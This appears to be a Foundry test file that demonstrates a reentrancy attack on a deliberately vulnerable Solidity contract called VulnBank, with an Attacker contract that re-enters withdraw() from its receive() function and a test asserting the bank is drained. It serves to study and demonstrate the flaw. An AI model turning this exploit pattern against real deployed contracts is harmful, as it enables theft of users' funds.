// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnBank.sol";

/// @dev helper contract that re-enters the bank during withdraw
contract Attacker {
    VulnBank bank;

    constructor(VulnBank _bank) {
        bank = _bank;
    }

    // re-enter when Ether is received
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(); // first withdraw → re-enter in receive()
    }
}

contract ReentrancyTest is Test {
    VulnBank bank;
    Attacker attacker;

    function setUp() public {
        bank     = new VulnBank();
        attacker = new Attacker(bank);

        // seed the bank so the second (re-entrant) withdrawal has funds to steal
        bank.deposit{value: 10 ether}();

        // give the attacker some starting ETH
        vm.deal(address(attacker), 2 ether);
    }

    function testExploit() public {
        uint256 start = address(attacker).balance;

        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();

        // attacker balance increased  → exploit succeeded
        assertGt(address(attacker).balance, start);
        // bank drained
        assertEq(address(bank).balance, 0);
    }
}
